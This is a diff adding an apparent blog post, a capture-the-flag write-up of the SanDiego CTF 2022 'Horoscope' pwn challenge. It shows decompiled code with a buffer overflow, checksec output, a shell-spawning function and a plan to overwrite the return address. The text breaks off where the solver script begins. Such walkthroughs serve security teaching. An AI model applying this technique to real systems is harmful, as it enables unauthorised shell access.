@@ -1,0 +1,1335 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <title>SanDiego CTF 2022 | Welcome to Chovid99&#39;s Blog</title>
+
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width,minimum-scale=1">
+<meta property="og:title" content="SanDiego CTF 2022" />
+<meta property="og:description" content="Writeup for SanDiego CTF 2022 by Chovid99" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chovid99.github.io/posts/sandiego-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/site-feature-image.jpeg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-05-09T08:54:22+07:00" />
+<meta property="article:modified_time" content="2022-05-09T08:54:22+07:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image:src" content="https://chovid99.github.io/site-feature-image.jpeg"/>
+
+<meta name="twitter:title" content="SanDiego CTF 2022"/>
+<meta name="twitter:description" content="Writeup for SanDiego CTF 2022 by Chovid99"/>
+<meta name="twitter:site" content="@Chovid99"/>
+<meta name="twitter:creator" content="@Chovid99"/>
+<meta property="og:site_name" content="Chovid99's Blog">
+
+<meta name="generator" content="Hugo 0.95.0" />
+
+
+  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/tocbot.css">
+
+
+
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-19HP521HQ9');
+  </script>
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
+    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>
+
+
+
+
+
+
+  </head>
+
+  <body>
+    <nav class="navigation">
+	
+		<a href="/"> <span class="arrow">←</span>Home</a>
+	
+	<a href="/posts">Posts</a>
+	<a href="/tags">Tags</a>
+	<a href="/about">About</a>
+
+	
+
+	
+</nav>
+
+
+    <main class="main">
+      
+
+<section id="single">
+    <h1 class="title">SanDiego CTF 2022</h1>
+
+    <div class="tip">
+        <time datetime="2022-05-09 08:54:22 &#43;0700 WIB">May 9, 2022</time>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          3137 words
+        </span>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          15 minute read
+        </span>
+    </div>
+
+    <div class="content">
+      <div class="post-content js-toc-content">
+        <p><p class="markdown-image">
+  <img src="https://i.imgur.com/pvHiD15.png" alt=""  />
+</p>
+SanDiego CTF is pretty unique because the CTF platform is using Discord. I only have time to look at the pwn challenge, so here&rsquo;s my writeup for some challenge that I solved</p>
+<h2 id="pwn">Pwn <a href="#pwn" class="anchor">#</a></h2>
+<h3 id="horoscope">Horoscope <a href="#horoscope" class="anchor">#</a></h3>
+<h4 id="initial-analysis">Initial Analysis <a href="#initial-analysis" class="anchor">#</a></h4>
+<p>We were given a binary. Let&rsquo;s disassemble it:</p>
+<p><strong>main</strong></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_38 [<span style="color:#f60">48</span>];
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Welcome to SDCTF</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">s very own text based horoscope&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(
+</span></span><span style="display:flex;"><span>      <span style="color:#c30">&#34;please put in your birthday and time in the format (month/day/year/time) and we will have you r very own horoscope&#34;</span>
+</span></span><span style="display:flex;"><span>      );
+</span></span><span style="display:flex;"><span>  fflush(stdout);
+</span></span><span style="display:flex;"><span>  fgets(local_38,<span style="color:#f60">0x140</span>,stdin);
+</span></span><span style="display:flex;"><span>  processInput(local_38);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>processInput</strong></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">processInput</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>param_1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>__nptr;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> local_1c;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>local_18;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> local_c;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  __nptr <span style="color:#555">=</span> strtok(param_1,<span style="color:#c30">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">for</span> (local_1c <span style="color:#555">=</span> <span style="color:#f60">0</span>; local_1c <span style="color:#555">&lt;</span> <span style="color:#f60">4</span>; local_1c <span style="color:#555">=</span> local_1c <span style="color:#555">+</span> <span style="color:#f60">1</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (local_1c <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
+</span></span><span style="display:flex;"><span>      local_c <span style="color:#555">=</span> atoi(__nptr);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (local_1c <span style="color:#555">==</span> <span style="color:#f60">3</span>) {
+</span></span><span style="display:flex;"><span>      atoi(__nptr);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">switch</span>(local_c) {
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">default</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;thats not a valid date &gt;:-(&#34;</span>);
+</span></span><span style="display:flex;"><span>    fflush(stdout);
+</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#f60">1</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">1</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    local_18 <span style="color:#555">=</span> <span style="color:#c30">&#34;January&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">2</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    local_18 <span style="color:#555">=</span> <span style="color:#c30">&#34;February&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">3</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    local_18 <span style="color:#555">=</span> <span style="color:#c30">&#34;March&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">4</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    local_18 <span style="color:#555">=</span> <span style="color:#c30">&#34;April&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">5</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    local_18 <span style="color:#555">=</span> <span style="color:#c30">&#34;May&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">6</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    local_18 <span style="color:#555">=</span> <span style="color:#c30">&#34;June&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">7</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    local_18 <span style="color:#555">=</span> <span style="color:#c30">&#34;July&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">8</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    local_18 <span style="color:#555">=</span> <span style="color:#c30">&#34;August&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">9</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    local_18 <span style="color:#555">=</span> <span style="color:#c30">&#34;September&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">10</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    local_18 <span style="color:#555">=</span> <span style="color:#c30">&#34;October&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">0xb</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    local_18 <span style="color:#555">=</span> <span style="color:#c30">&#34;November&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">0xc</span><span style="color:#555">:</span>
+</span></span><span style="display:flex;"><span>    local_18 <span style="color:#555">=</span> <span style="color:#c30">&#34;December&#34;</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;wow, you were born in the month of %s. I think that means you will have a great week! :)&#34;</span>,
+</span></span><span style="display:flex;"><span>         local_18);
+</span></span><span style="display:flex;"><span>  fflush(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Looking at the main, there is buffer overflow bug. Looking at the <code>checksec</code> result, there isn&rsquo;t any canary also:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    No canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE (0x400000)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And then we also found a <code>test</code> function which call <code>system('/bin/sh')</code></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">test</span>(<span style="color:#078;font-weight:bold">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (temp <span style="color:#555">==</span> <span style="color:#f60">1</span>) {
+</span></span><span style="display:flex;"><span>    system(<span style="color:#c30">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notes that the if else doesn&rsquo;t matter, because we can directly use the <code>system</code> line instead of the start of the <code>test</code> function</p>
+<h4 id="exploitation-plan">Exploitation Plan <a href="#exploitation-plan" class="anchor">#</a></h4>
+<p>Well, simply use the buffer overflow bug to overwrite the <code>main</code> ret to the given <code>system</code> line of code. Also make sure that our buffer overflow payload should follow the <code>processInput</code> validation (which is a date).</p>
+<h4 id="solution">Solution <a href="#solution" class="anchor">#</a></h4>
+<p>Below is the full solver script to buffer overflow it:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
